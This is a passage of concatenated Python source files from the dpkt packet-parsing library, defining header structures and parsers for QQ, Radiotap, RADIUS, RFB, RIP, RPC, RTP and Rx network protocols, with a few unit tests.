QQ_FILE_CMD_TRANSFER_FINISHED = 0x0003
QQ_FILE_CMD_FILE_OP = 0x0007
QQ_FILE_CMD_FILE_OP_ACK = 0x0008
QQ_FILE_CMD_SENDER_SAY_HELLO   = 0x0031
QQ_FILE_CMD_SENDER_SAY_HELLO_ACK  = 0x0032
QQ_FILE_CMD_RECEIVER_SAY_HELLO  = 0x0033
QQ_FILE_CMD_RECEIVER_SAY_HELLO_ACK  = 0x0034
QQ_FILE_CMD_NOTIFY_IP_ACK   = 0x003C
QQ_FILE_CMD_PING      = 0x003D
QQ_FILE_CMD_PONG   = 0x003E
QQ_FILE_CMD_YES_I_AM_BEHIND_FIREWALL = 0x0040
QQ_FILE_CMD_REQUEST_AGENT = 0x0001
QQ_FILE_CMD_CHECK_IN = 0x0002
QQ_FILE_CMD_FORWARD = 0x0003
QQ_FILE_CMD_FORWARD_FINISHED = 0x0004
QQ_FILE_CMD_IT_IS_TIME = 0x0005
QQ_FILE_CMD_I_AM_READY = 0x0006

command_str = {
    0x0001: "QQ_CMD_LOGOUT",
    0x0002: "QQ_CMD_KEEP_ALIVE",
    0x0004: "QQ_CMD_MODIFY_INFO",
    0x0005: "QQ_CMD_SEARCH_USER",
    0x0006: "QQ_CMD_GET_USER_INFO",
    0x0009: "QQ_CMD_ADD_FRIEND",
    0x000A: "QQ_CMD_DELETE_FRIEND",
    0x000B: "QQ_CMD_ADD_FRIEND_AUTH",
    0x000D: "QQ_CMD_CHANGE_STATUS",
    0x0012: "QQ_CMD_ACK_SYS_MSG",
    0x0016: "QQ_CMD_SEND_IM",
    0x0017: "QQ_CMD_RECV_IM",
    0x001C: "QQ_CMD_REMOVE_SELF",
    0x001D: "QQ_CMD_REQUEST_KEY",
    0x0022: "QQ_CMD_LOGIN",
    0x0026: "QQ_CMD_GET_FRIEND_LIST",
    0x0027: "QQ_CMD_GET_ONLINE_OP",
    0x002D: "QQ_CMD_SEND_SMS",
    0x0030: "QQ_CMD_CLUSTER_CMD",
    0x0031: "QQ_CMD_TEST",
    0x003C: "QQ_CMD_GROUP_DATA_OP",
    0x003D: "QQ_CMD_UPLOAD_GROUP_FRIEND",
    0x003E: "QQ_CMD_FRIEND_DATA_OP",
    0x0058: "QQ_CMD_DOWNLOAD_GROUP_FRIEND",
    0x005C: "QQ_CMD_FRIEND_LEVEL_OP",
    0x005E: "QQ_CMD_PRIVACY_DATA_OP",
    0x005F: "QQ_CMD_CLUSTER_DATA_OP",
    0x0061: "QQ_CMD_ADVANCED_SEARCH",
    0x0062: "QQ_CMD_REQUEST_LOGIN_TOKEN",
    0x0065: "QQ_CMD_USER_PROPERTY_OP",
    0x0066: "QQ_CMD_TEMP_SESSION_OP",
    0x0067: "QQ_CMD_SIGNATURE_OP",
    0x0080: "QQ_CMD_RECV_MSG_SYS",
    0x0081: "QQ_CMD_RECV_MSG_FRIEND_CHANGE_STATUS",
    0x00A6: "QQ_CMD_WEATHER_OP",
    0x00A7: "QQ_CMD_ADD_FRIEND_EX",
    0x00A8: "QQ_CMD_AUTHORIZE",
    0xFFFF: "QQ_CMD_UNKNOWN",
    0x0021: "_CMD_REQUEST_AGENT",
    0x0022: "_CMD_REQUEST_FACE",
    0x0023: "_CMD_TRANSFER",
    0x0026: "_CMD_REQUEST_BEGIN",
}


class QQBasicPacket(Packet):
    __hdr__ = (
        ('header_type', 'B', 2),
        ('source',      'H', 0),
        ('command',     'H', 0),
        ('sequence',    'H', 0),
        ('qqNum',       'L', 0),
    )


class QQ3Packet(Packet):
     __hdr__ = (
        ('header_type', 'B', 3),
        ('command',     'B', 0),
        ('sequence',    'H', 0),
        ('unknown1',    'L', 0),
        ('unknown2',    'L', 0),
        ('unknown3',    'L', 0),
        ('unknown4',    'L', 0),
        ('unknown5',    'L', 0),
        ('unknown6',    'L', 0),
        ('unknown7',    'L', 0),
        ('unknown8',    'L', 0),
        ('unknown9',    'L', 0),
        ('unknown10',   'B', 1),
        ('unknown11',   'B', 0),
        ('unknown12',   'B', 0),
        ('source',      'H', 0),
        ('unknown13',   'B', 0),
    )


class QQ5Packet(Packet):
    __hdr__ = (
        ('header_type', 'B', 5),
        ('source',      'H', 0),
        ('unknown',     'H', 0),
        ('command',     'H', 0),
        ('sequence',    'H', 0),
        ('qqNum',       'L', 0),
    )

########NEW FILE########
__FILENAME__ = radiotap
'''Radiotap'''

import dpkt

# Ref: http://www.radiotap.org
# Fields Ref: http://www.radiotap.org/defined-fields/all

# Present flags
_TSFT_MASK            = 0x1000000
_FLAGS_MASK           = 0x2000000
_RATE_MASK            = 0x4000000
_CHANNEL_MASK         = 0x8000000
_FHSS_MASK            = 0x10000000
_ANT_SIG_MASK         = 0x20000000
_ANT_NOISE_MASK       = 0x40000000
_LOCK_QUAL_MASK       = 0x80000000
_TX_ATTN_MASK         = 0x10000
_DB_TX_ATTN_MASK      = 0x20000
_DBM_TX_POWER_MASK    = 0x40000
_ANTENNA_MASK         = 0x80000
_DB_ANT_SIG_MASK      = 0x100000
_DB_ANT_NOISE_MASK    = 0x200000
_RX_FLAGS_MASK        = 0x400000
_CHANNELPLUS_MASK     = 0x200
_EXT_MASK             = 0x1

_TSFT_SHIFT           = 24
_FLAGS_SHIFT          = 25
_RATE_SHIFT           = 26
_CHANNEL_SHIFT        = 27
_FHSS_SHIFT           = 28
_ANT_SIG_SHIFT        = 29
_ANT_NOISE_SHIFT      = 30
_LOCK_QUAL_SHIFT      = 31
_TX_ATTN_SHIFT        = 16
_DB_TX_ATTN_SHIFT     = 17
_DBM_TX_POWER_SHIFT   = 18
_ANTENNA_SHIFT        = 19
_DB_ANT_SIG_SHIFT     = 20
_DB_ANT_NOISE_SHIFT   = 21
_RX_FLAGS_SHIFT       = 22
_CHANNELPLUS_SHIFT    = 10
_EXT_SHIFT            = 0

# Flags elements
_FLAGS_SIZE           = 2
_CFP_FLAG_SHIFT       = 0
_PREAMBLE_SHIFT       = 1
_WEP_SHIFT            = 2
_FRAG_SHIFT           = 3
_FCS_SHIFT            = 4
_DATA_PAD_SHIFT       = 5
_BAD_FCS_SHIFT        = 6
_SHORT_GI_SHIFT       = 7

# Channel type
_CHAN_TYPE_SIZE       = 4
_CHANNEL_TYPE_SHIFT   = 4
_CCK_SHIFT            = 5
_OFDM_SHIFT           = 6
_TWO_GHZ_SHIFT        = 7
_FIVE_GHZ_SHIFT       = 8
_PASSIVE_SHIFT        = 9
_DYN_CCK_OFDM_SHIFT   = 10
_GFSK_SHIFT           = 11
_GSM_SHIFT            = 12
_STATIC_TURBO_SHIFT   = 13
_HALF_RATE_SHIFT      = 14
_QUARTER_RATE_SHIFT   = 15

class Radiotap(dpkt.Packet):
    __hdr__ = (
        ('version', 'B', 0),
        ('pad', 'B', 0),
        ('length', 'H', 0),
        ('present_flags', 'I', 0)
        )

    def _get_tsft_present(self): return (self.present_flags & _TSFT_MASK) >> _TSFT_SHIFT
    def _set_tsft_present(self, val): self.present_flags = self.present_flags | (val << _TSFT_SHIFT)
    def _get_flags_present(self): return (self.present_flags & _FLAGS_MASK) >> _FLAGS_SHIFT
    def _set_flags_present(self, val): self.present_flags = self.present_flags | (val << _FLAGS_SHIFT)
    def _get_rate_present(self): return (self.present_flags & _RATE_MASK) >> _RATE_SHIFT
    def _set_rate_present(self, val): self.present_flags = self.present_flags | (val <<    _RATE_SHIFT)
    def _get_channel_present(self): return (self.present_flags & _CHANNEL_MASK) >> _CHANNEL_SHIFT
    def _set_channel_present(self, val): self.present_flags = self.present_flags | (val << _CHANNEL_SHIFT)
    def _get_fhss_present(self): return (self.present_flags & _FHSS_MASK) >> _FHSS_SHIFT
    def _set_fhss_present(self, val): self.present_flags = self.present_flags | (val << _FHSS_SHIFT)
    def _get_ant_sig_present(self): return (self.present_flags & _ANT_SIG_MASK) >> _ANT_SIG_SHIFT
    def _set_ant_sig_present(self, val): self.present_flags = self.present_flags | (val << _ANT_SIG_SHIFT)
    def _get_ant_noise_present(self): return (self.present_flags & _ANT_NOISE_MASK) >> _ANT_NOISE_SHIFT
    def _set_ant_noise_present(self, val): self.present_flags = self.present_flags | (val << _ANT_NOISE_SHIFT)
    def _get_lock_qual_present(self): return (self.present_flags & _LOCK_QUAL_MASK) >> _LOCK_QUAL_SHIFT
    def _set_lock_qual_present(self, val): self.present_flags = self.present_flags | (val << _LOCK_QUAL_SHIFT)
    def _get_tx_attn_present(self): return (self.present_flags & _TX_ATTN_MASK) >> _TX_ATTN_SHIFT
    def _set_tx_attn_present(self, val): self.present_flags = self.present_flags | (val  << _TX_ATTN_SHIFT)
    def _get_db_tx_attn_present(self): return (self.present_flags & _DB_TX_ATTN_MASK) >> _DB_TX_ATTN_SHIFT
    def _set_db_tx_attn_present(self, val): self.present_flags = self.present_flags | (val << _DB_TX_ATTN_SHIFT)
    def _get_dbm_power_present(self): return (self.present_flags & _DBM_TX_POWER_MASK) >> _DBM_TX_POWER_SHIFT
    def _set_dbm_power_present(self, val): self.present_flags = self.present_flags | (val << _DBM_TX_POWER_SHIFT)
    def _get_ant_present(self): return (self.present_flags & _ANTENNA_MASK) >> _ANTENNA_SHIFT
    def _set_ant_present(self, val): self.present_flags = self.present_flags | (val << _ANTENNA_SHIFT)
    def _get_db_ant_sig_present(self): return (self.present_flags & _DB_ANT_SIG_MASK) >> _DB_ANT_SIG_SHIFT
    def _set_db_ant_sig_present(self, val): self.present_flags = self.present_flags | (val << _DB_ANT_SIG_SHIFT)
    def _get_db_ant_noise_present(self): return (self.present_flags & _DB_ANT_NOISE_MASK) >> _DB_ANT_NOISE_SHIFT
    def _set_db_ant_noise_present(self, val): self.present_flags =    self.present_flags | (val << _DB_ANT_NOISE_SHIFT)
    def _get_rx_flags_present(self): return (self.present_flags & _RX_FLAGS_MASK) >> _RX_FLAGS_SHIFT
    def _set_rx_flags_present(self, val): self.present_flags = self.present_flags | (val << _RX_FLAGS_SHIFT)
    def _get_chanplus_present(self): return (self.present_flags & _CHANNELPLUS_MASK) >> _CHANNELPLUS_SHIFT
    def _set_chanplus_present(self, val): self.present_flags = self.present_flags | (val << _CHANNELPLUS_SHIFT)
    def _get_ext_present(self): return (self.present_flags & _EXT_MASK) >> _EXT_SHIFT
    def _set_ext_present(self, val): self.present_flags = self.present_flags | (val << _EXT_SHIFT)

    tsft_present = property(_get_tsft_present, _set_tsft_present)
    flags_present = property(_get_flags_present, _set_flags_present)
    rate_present = property(_get_rate_present, _set_rate_present)
    channel_present = property(_get_channel_present, _set_channel_present)
    fhss_present = property(_get_fhss_present, _set_fhss_present)
    ant_sig_present = property(_get_ant_sig_present, _set_ant_sig_present)
    ant_noise_present = property(_get_ant_noise_present, _set_ant_noise_present)
    lock_qual_present = property(_get_lock_qual_present, _set_lock_qual_present)
    tx_attn_present = property(_get_tx_attn_present, _set_tx_attn_present)
    db_tx_attn_present = property(_get_db_tx_attn_present, _set_db_tx_attn_present)
    dbm_tx_power_present = property(_get_dbm_power_present, _set_dbm_power_present)
    ant_present = property(_get_ant_present, _set_ant_present)
    db_ant_sig_present = property(_get_db_ant_sig_present, _set_db_ant_sig_present)
    db_ant_noise_present = property(_get_db_ant_noise_present, _set_db_ant_noise_present)
    rx_flags_present = property(_get_rx_flags_present, _set_rx_flags_present)
    chanplus_present = property(_get_chanplus_present, _set_chanplus_present)
    ext_present = property(_get_ext_present, _set_ext_present)
    
    def unpack(self, buf):
        dpkt.Packet.unpack(self, buf)
        self.data = buf[self.length:]
        
        self.fields = []
        buf = buf[self.__hdr_len__:]

        # decode each field into self.<name> (eg. self.tsft) as well as append it self.fields list
        field_decoder = [
            ('tsft', self.tsft_present, self.TSFT),
            ('flags', self.flags_present, self.Flags),
            ('rate', self.rate_present, self.Rate),
            ('channel', self.channel_present, self.Channel),
            ('fhss', self.fhss_present, self.FHSS),
            ('ant_sig', self.ant_sig_present, self.AntennaSignal),
            ('ant_noise', self.ant_noise_present, self.AntennaNoise),
            ('lock_qual', self.lock_qual_present, self.LockQuality),
            ('tx_attn', self.tx_attn_present, self.TxAttenuation),
            ('db_tx_attn', self.db_tx_attn_present, self.DbTxAttenuation),
            ('dbm_tx_power', self.dbm_tx_power_present, self.DbmTxPower),
            ('ant', self.ant_present, self.Antenna),
            ('db_ant_sig', self.db_ant_sig_present, self.DbAntennaSignal),
            ('db_ant_noise', self.db_ant_noise_present, self.DbAntennaNoise),
            ('rx_flags', self.rx_flags_present, self.RxFlags)
        ]
        for name, present_bit, parser in field_decoder:
            if present_bit:
                field = parser(buf)
                field.data = ''
                setattr(self, name, field)
                self.fields.append(field)
                buf = buf[len(field):]

    class Antenna(dpkt.Packet):
        __hdr__ = (
            ('index', 'B',  0),
            )

    class AntennaNoise(dpkt.Packet):
        __hdr__ = (
            ('db', 'B', 0),
            )

    class AntennaSignal(dpkt.Packet):
        __hdr__ = (
            ('db',  'B', 0),
            )

    class Channel(dpkt.Packet):
        __hdr__ = (
            ('freq', 'H', 0),
            ('flags', 'H',  0),
            )

    class FHSS(dpkt.Packet):
        __hdr__ = (
            ('set', 'B', 0),
            ('pattern', 'B', 0),
            )

    class Flags(dpkt.Packet):
        __hdr__ = (
            ('val', 'B', 0),
            )

    class LockQuality(dpkt.Packet):
        __hdr__ = (
            ('val', 'H', 0),
            )

    class RxFlags(dpkt.Packet):
        __hdr__ = (
            ('val', 'H', 0),
            )

    class Rate(dpkt.Packet):
        __hdr__ = (
            ('val', 'B', 0),
            )

    class TSFT(dpkt.Packet):
        __hdr__ = (
            ('usecs', 'Q', 0),
            )

    class TxAttenuation(dpkt.Packet):
        __hdr__ = (
            ('val',  'H', 0),
            )

    class DbTxAttenuation(dpkt.Packet):
        __hdr__ = (
            ('db', 'H', 0),
            )

    class DbAntennaNoise(dpkt.Packet):
        __hdr__ = (
            ('db', 'B', 0),
            )

    class DbAntennaSignal(dpkt.Packet):
        __hdr__ = (
            ('db', 'B', 0),
            )

    class DbmTxPower(dpkt.Packet):
        __hdr__ = (
            ('dbm', 'B', 0),
            )

if __name__ == '__main__':
    import unittest

    class RadiotapTestCase(unittest.TestCase):
        def test_Radiotap(self):
            s = '\x00\x00\x00\x18\x6e\x48\x00\x00\x00\x02\x6c\x09\xa0\x00\xa8\x81\x02\x00\x00\x00\x00\x00\x00\x00'
            rad = Radiotap(s)
            self.failUnless(rad.version == 0)
            self.failUnless(rad.present_flags == 0x6e480000)
            self.failUnless(rad.tsft_present == 0)
            self.failUnless(rad.flags_present == 1)
            self.failUnless(rad.rate_present == 1)
            self.failUnless(rad.channel_present == 1)
            self.failUnless(rad.fhss_present == 0)
            self.failUnless(rad.ant_sig_present == 1)
            self.failUnless(rad.ant_noise_present == 1)
            self.failUnless(rad.lock_qual_present == 0)
            self.failUnless(rad.db_tx_attn_present == 0)
            self.failUnless(rad.dbm_tx_power_present == 0)
            self.failUnless(rad.ant_present == 1)
            self.failUnless(rad.db_ant_sig_present == 0)
            self.failUnless(rad.db_ant_noise_present == 0)
            self.failUnless(rad.rx_flags_present == 1)
            self.failUnless(rad.channel.freq == 0x6c09)
            self.failUnless(rad.channel.flags == 0xa000)
            self.failUnless(len(rad.fields) == 7)
    unittest.main()

########NEW FILE########
__FILENAME__ = radius
# $Id: radius.py 23 2006-11-08 15:45:33Z dugsong $

"""Remote Authentication Dial-In User Service."""

import dpkt

# http://www.untruth.org/~josh/security/radius/radius-auth.html
# RFC 2865

class RADIUS(dpkt.Packet):
    __hdr__ = (
        ('code', 'B', 0),
        ('id', 'B', 0),
        ('len', 'H', 4),
        ('auth', '16s', '')
        )
    attrs = ''
    def unpack(self, buf):
        dpkt.Packet.unpack(self, buf)
        self.attrs = parse_attrs(self.data)
        self.data = ''

def parse_attrs(buf):
    """Parse attributes buffer into a list of (type, data) tuples."""
    attrs = []
    while buf:
        t = ord(buf[0])
        l = ord(buf[1])
        if l < 2:
            break
        d, buf = buf[2:l], buf[l:]
        attrs.append((t, d))
    return attrs

# Codes
RADIUS_ACCESS_REQUEST	= 1
RADIUS_ACCESS_ACCEPT	= 2
RADIUS_ACCESS_REJECT	= 3
RADIUS_ACCT_REQUEST	= 4
RADIUS_ACCT_RESPONSE	= 5
RADIUS_ACCT_STATUS	= 6
RADIUS_ACCESS_CHALLENGE	= 11

# Attributes
RADIUS_USER_NAME		= 1
RADIUS_USER_PASSWORD		= 2
RADIUS_CHAP_PASSWORD		= 3
RADIUS_NAS_IP_ADDR      	= 4
RADIUS_NAS_PORT			= 5
RADIUS_SERVICE_TYPE		= 6
RADIUS_FRAMED_PROTOCOL		= 7
RADIUS_FRAMED_IP_ADDR		= 8
RADIUS_FRAMED_IP_NETMASK	= 9
RADIUS_FRAMED_ROUTING		= 10
RADIUS_FILTER_ID		= 11
RADIUS_FRAMED_MTU		= 12
RADIUS_FRAMED_COMPRESSION	= 13
RADIUS_LOGIN_IP_HOST		= 14
RADIUS_LOGIN_SERVICE		= 15
RADIUS_LOGIN_TCP_PORT		= 16
# unassigned
RADIUS_REPLY_MESSAGE		= 18
RADIUS_CALLBACK_NUMBER		= 19
RADIUS_CALLBACK_ID		= 20
# unassigned
RADIUS_FRAMED_ROUTE		= 22
RADIUS_FRAMED_IPX_NETWORK	= 23
RADIUS_STATE			= 24
RADIUS_CLASS			= 25
RADIUS_VENDOR_SPECIFIC		= 26
RADIUS_SESSION_TIMEOUT		= 27
RADIUS_IDLE_TIMEOUT		= 28
RADIUS_TERMINATION_ACTION	= 29
RADIUS_CALLED_STATION_ID	= 30
RADIUS_CALLING_STATION_ID	= 31
RADIUS_NAS_ID			= 32
RADIUS_PROXY_STATE		= 33
RADIUS_LOGIN_LAT_SERVICE	= 34
RADIUS_LOGIN_LAT_NODE		= 35
RADIUS_LOGIN_LAT_GROUP		= 36
RADIUS_FRAMED_ATALK_LINK	= 37
RADIUS_FRAMED_ATALK_NETWORK	= 38
RADIUS_FRAMED_ATALK_ZONE	= 39
# 40-59 reserved for accounting
RADIUS_CHAP_CHALLENGE		= 60
RADIUS_NAS_PORT_TYPE		= 61
RADIUS_PORT_LIMIT		= 62
RADIUS_LOGIN_LAT_PORT		= 63

########NEW FILE########
__FILENAME__ = rfb
# $Id: rfb.py 47 2008-05-27 02:10:00Z jon.oberheide $

"""Remote Framebuffer Protocol."""

import dpkt

# Remote Framebuffer Protocol
# http://www.realvnc.com/docs/rfbproto.pdf

# Client to Server Messages
CLIENT_SET_PIXEL_FORMAT           = 0
CLIENT_SET_ENCODINGS              = 2
CLIENT_FRAMEBUFFER_UPDATE_REQUEST = 3
CLIENT_KEY_EVENT                  = 4
CLIENT_POINTER_EVENT              = 5
CLIENT_CUT_TEXT                   = 6

# Server to Client Messages
SERVER_FRAMEBUFFER_UPDATE         = 0
SERVER_SET_COLOUR_MAP_ENTRIES     = 1
SERVER_BELL                       = 2
SERVER_CUT_TEXT                   = 3

class RFB(dpkt.Packet):
    __hdr__ = (
        ('type', 'B', 0),
        )

class SetPixelFormat(dpkt.Packet):
    __hdr__ = (
        ('pad', '3s', ''),
        ('pixel_fmt', '16s', '')
        )

class SetEncodings(dpkt.Packet):
    __hdr__ = (
        ('pad', '1s', ''),
        ('num_encodings', 'H', 0)
        )

class FramebufferUpdateRequest(dpkt.Packet):
    __hdr__ = (
        ('incremental', 'B', 0),
        ('x_position', 'H', 0),
        ('y_position', 'H', 0),
        ('width', 'H', 0),
        ('height', 'H', 0)
        )

class KeyEvent(dpkt.Packet):
    __hdr__ = (
        ('down_flag', 'B', 0),
        ('pad', '2s', ''),
        ('key', 'I', 0)
        )

class PointerEvent(dpkt.Packet):
    __hdr__ = (
        ('button_mask', 'B', 0),
        ('x_position', 'H', 0),
        ('y_position', 'H', 0)
        )

class FramebufferUpdate(dpkt.Packet):
    __hdr__ = (
        ('pad', '1s', ''),
        ('num_rects', 'H', 0)
        )

class SetColourMapEntries(dpkt.Packet):
    __hdr__ = (
        ('pad', '1s', ''),
        ('first_colour', 'H', 0),
        ('num_colours', 'H', 0)
        )

class CutText(dpkt.Packet):
    __hdr__ = (
        ('pad', '3s', ''),
        ('length', 'I', 0)
        )

########NEW FILE########
__FILENAME__ = rip
# $Id: rip.py 23 2006-11-08 15:45:33Z dugsong $

"""Routing Information Protocol."""

import dpkt

# RIP v2 - RFC 2453
# http://tools.ietf.org/html/rfc2453

REQUEST = 1
RESPONSE = 2

class RIP(dpkt.Packet):
    __hdr__ = (
        ('cmd', 'B', REQUEST),
        ('v', 'B', 2),
        ('rsvd', 'H', 0)
        )

    def unpack(self, buf):
        dpkt.Packet.unpack(self, buf)
        l = []
        self.auth = None
        while self.data:
            rte = RTE(self.data[:20])
            if rte.family == 0xFFFF:
                self.auth = Auth(self.data[:20])
            else:
                l.append(rte)
            self.data = self.data[20:]
        self.data = self.rtes = l

    def __len__(self):
        len = self.__hdr_len__
        if self.auth:
            len += len(self.auth)
        len += sum(map(len, self.rtes))
        return len

    def __str__(self):
        auth = ''
        if self.auth:
            auth = str(self.auth)
        return self.pack_hdr() + \
               auth + \
               ''.join(map(str, self.rtes))

class RTE(dpkt.Packet):
    __hdr__ = (
        ('family', 'H', 2),
        ('route_tag', 'H', 0),
        ('addr', 'I', 0),
        ('subnet', 'I', 0),
        ('next_hop', 'I', 0),
        ('metric', 'I', 1)
        )

class Auth(dpkt.Packet):
    __hdr__ = (
        ('rsvd', 'H', 0xFFFF),
        ('type', 'H', 2),
        ('auth', '16s', 0)
        )

if __name__ == '__main__':
    import unittest

    class RIPTestCase(unittest.TestCase):
        def testPack(self):
            r = RIP(self.s)
            self.failUnless(self.s == str(r))

        def testUnpack(self):
            r = RIP(self.s)
            self.failUnless(r.auth == None)
            self.failUnless(len(r.rtes) == 2)

            rte = r.rtes[1]
            self.failUnless(rte.family == 2)
            self.failUnless(rte.route_tag == 0)
            self.failUnless(rte.metric == 1)

        s = '\x02\x02\x00\x00\x00\x02\x00\x00\x01\x02\x03\x00\xff\xff\xff\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x02\x00\x00\xc0\xa8\x01\x08\xff\xff\xff\xfc\x00\x00\x00\x00\x00\x00\x00\x01'
    unittest.main()

########NEW FILE########
__FILENAME__ = rpc
# $Id: rpc.py 23 2006-11-08 15:45:33Z dugsong $

"""Remote Procedure Call."""

import struct
import dpkt

# RPC.dir
CALL = 0
REPLY = 1

# RPC.Auth.flavor
AUTH_NONE = AUTH_NULL = 0
AUTH_UNIX = 1
AUTH_SHORT = 2
AUTH_DES = 3

# RPC.Reply.stat
MSG_ACCEPTED = 0
MSG_DENIED = 1

# RPC.Reply.Accept.stat
SUCCESS = 0
PROG_UNAVAIL = 1
PROG_MISMATCH = 2
PROC_UNAVAIL = 3
GARBAGE_ARGS = 4
SYSTEM_ERR = 5

# RPC.Reply.Reject.stat
RPC_MISMATCH = 0
AUTH_ERROR = 1

class RPC(dpkt.Packet):
    __hdr__ = (
        ('xid', 'I', 0),
        ('dir', 'I', CALL)
        )
    class Auth(dpkt.Packet):
        __hdr__ = (('flavor', 'I', AUTH_NONE), )
        def unpack(self, buf):
            dpkt.Packet.unpack(self, buf)
            n = struct.unpack('>I', self.data[:4])[0]
            self.data = self.data[4:4+n]
        def __len__(self):
            return 8 + len(self.data)
        def __str__(self):
            return self.pack_hdr() + struct.pack('>I', len(self.data)) + \
                   str(self.data)
    
    class Call(dpkt.Packet):
        __hdr__ = (
            ('rpcvers', 'I', 2),
            ('prog', 'I', 0),
            ('vers', 'I', 0),
            ('proc', 'I', 0)
            )
        def unpack(self, buf):
            dpkt.Packet.unpack(self, buf)
            self.cred = RPC.Auth(self.data)
            self.verf = RPC.Auth(self.data[len(self.cred):])
            self.data = self.data[len(self.cred) + len(self.verf):]
        def __len__(self):
            return len(str(self)) # XXX
        def __str__(self):
            return dpkt.Packet.__str__(self) + \
                   str(getattr(self, 'cred', RPC.Auth())) + \
                   str(getattr(self, 'verf', RPC.Auth())) + \
                   str(self.data)
    
    class Reply(dpkt.Packet):
        __hdr__ = (('stat', 'I', MSG_ACCEPTED), )

        class Accept(dpkt.Packet):
            __hdr__ = (('stat', 'I', SUCCESS), )
            def unpack(self, buf):
                self.verf = RPC.Auth(buf)
                buf = buf[len(self.verf):]
                self.stat = struct.unpack('>I', buf[:4])[0]
                if self.stat == SUCCESS:
                    self.data = buf[4:]
                elif self.stat == PROG_MISMATCH:
                    self.low, self.high = struct.unpack('>II', buf[4:12])
                    self.data = buf[12:]
            def __len__(self):
                if self.stat == PROG_MISMATCH: n = 8
                else: n = 0
                return len(self.verf) + 4 + n + len(self.data)
            def __str__(self):
                if self.stat == PROG_MISMATCH:
                    return str(self.verf) + struct.pack('>III', self.stat,
                        self.low, self.high) + self.data
                return str(self.verf) + dpkt.Packet.__str__(self)
        
        class Reject(dpkt.Packet):
            __hdr__ = (('stat', 'I', AUTH_ERROR), )
            def unpack(self, buf):
                dpkt.Packet.unpack(self, buf)
                if self.stat == RPC_MISMATCH:
                    self.low, self.high = struct.unpack('>II', self.data[:8])
                    self.data = self.data[8:]
                elif self.stat == AUTH_ERROR:
                    self.why = struct.unpack('>I', self.data[:4])[0]
                    self.data = self.data[4:]
            def __len__(self):
                if self.stat == RPC_MISMATCH: n = 8
                elif self.stat == AUTH_ERROR: n =4
                else: n = 0
                return 4 + n + len(self.data)
            def __str__(self):
                if self.stat == RPC_MISMATCH:
                    return struct.pack('>III', self.stat, self.low,
                                       self.high) + self.data
                elif self.stat == AUTH_ERROR:
                    return struct.pack('>II', self.stat, self.why) + self.data
                return dpkt.Packet.__str__(self)
        
        def unpack(self, buf):
            dpkt.Packet.unpack(self, buf)
            if self.stat == MSG_ACCEPTED:
                self.data = self.accept = self.Accept(self.data)
            elif self.status == MSG_DENIED:
                self.data = self.reject = self.Reject(self.data)
        
    def unpack(self, buf):
        dpkt.Packet.unpack(self, buf)
        if self.dir == CALL:
            self.data = self.call = self.Call(self.data)
        elif self.dir == REPLY:
            self.data = self.reply = self.Reply(self.data)

def unpack_xdrlist(cls, buf):
    l = []
    while buf:
        if buf.startswith('\x00\x00\x00\x01'):
            p = cls(buf[4:])
            l.append(p)
            buf = p.data
        elif buf.startswith('\x00\x00\x00\x00'):
            break
        else:
            raise dpkt.UnpackError, 'invalid XDR list'
    return l

def pack_xdrlist(*args):
    return '\x00\x00\x00\x01'.join(map(str, args)) + '\x00\x00\x00\x00'

########NEW FILE########
__FILENAME__ = rtp
# $Id: rtp.py 23 2006-11-08 15:45:33Z dugsong $

"""Real-Time Transport Protocol"""

from dpkt import Packet

# version 1100 0000 0000 0000 ! 0xC000  14
# p       0010 0000 0000 0000 ! 0x2000  13
# x       0001 0000 0000 0000 ! 0x1000  12
# cc      0000 1111 0000 0000 ! 0x0F00   8
# m       0000 0000 1000 0000 ! 0x0080   7
# pt      0000 0000 0111 1111 ! 0x007F   0
#

_VERSION_MASK= 0xC000
_P_MASK     = 0x2000
_X_MASK     = 0x1000
_CC_MASK    = 0x0F00
_M_MASK     = 0x0080
_PT_MASK    = 0x007F
_VERSION_SHIFT=14
_P_SHIFT    = 13
_X_SHIFT    = 12
_CC_SHIFT   = 8
_M_SHIFT    = 7
_PT_SHIFT   = 0

VERSION = 2

class RTP(Packet):
    __hdr__ = (
        ('_type', 'H',      0x8000),
        ('seq',     'H',    0),
        ('ts',      'I',    0),
        ('ssrc',    'I',    0),
    )
    csrc = ''

    def _get_version(self): return (self._type&_VERSION_MASK)>>_VERSION_SHIFT
    def _set_version(self, ver):
        self._type = (ver << _VERSION_SHIFT) | (self._type & ~_VERSION_MASK)
    def _get_p(self): return (self._type & _P_MASK) >> _P_SHIFT
    def _set_p(self, p): self._type = (p << _P_SHIFT) | (self._type & ~_P_MASK)
    def _get_x(self): return (self._type & _X_MASK) >> _X_SHIFT
    def _set_x(self, x): self._type = (x << _X_SHIFT) | (self._type & ~_X_MASK)
    def _get_cc(self): return (self._type & _CC_MASK) >> _CC_SHIFT
    def _set_cc(self, cc): self._type = (cc<<_CC_SHIFT)|(self._type&~_CC_MASK)
    def _get_m(self): return (self._type & _M_MASK) >> _M_SHIFT
    def _set_m(self, m): self._type = (m << _M_SHIFT) | (self._type & ~_M_MASK)
    def _get_pt(self): return (self._type & _PT_MASK) >> _PT_SHIFT
    def _set_pt(self, m): self._type = (m << _PT_SHIFT)|(self._type&~_PT_MASK)

    version = property(_get_version, _set_version)
    p = property(_get_p, _set_p)
    x = property(_get_x, _set_x)
    cc = property(_get_cc, _set_cc)
    m = property(_get_m, _set_m)
    pt = property(_get_pt, _set_pt)

    def __len__(self):
        return self.__hdr_len__ + len(self.csrc) + len(self.data)

    def __str__(self):
        return self.pack_hdr() + self.csrc + str(self.data)

    def unpack(self, buf):
        super(RTP, self).unpack(buf)
        self.csrc = buf[self.__hdr_len__:self.__hdr_len__ + self.cc * 4]
        self.data = buf[self.__hdr_len__ + self.cc * 4:]


########NEW FILE########
__FILENAME__ = rx
# $Id: rx.py 23 2006-11-08 15:45:33Z jonojono $

"""Rx Protocol."""

import dpkt

# Types
DATA                    = 0x01
ACK                     = 0x02
BUSY                    = 0x03
ABORT                   = 0x04
ACKALL                  = 0x05
CHALLENGE               = 0x06
RESPONSE                = 0x07
DEBUG                   = 0x08

# Flags
CLIENT_INITIATED        = 0x01 
REQUEST_ACK             = 0x02
LAST_PACKET             = 0x04
MORE_PACKETS            = 0x08
SLOW_START_OK           = 0x20
JUMBO_PACKET            = 0x20

# Security
SEC_NONE                = 0x00
SEC_BCRYPT              = 0x01
SEC_RXKAD               = 0x02
SEC_RXKAD_ENC           = 0x03

class Rx(dpkt.Packet):
    __hdr__ = (
        ('epoch', 'I', 0),
        ('cid', 'I', 0),
        ('call', 'I', 1),
        ('seq', 'I', 0),
        ('serial', 'I', 1),
        ('type', 'B', 0),
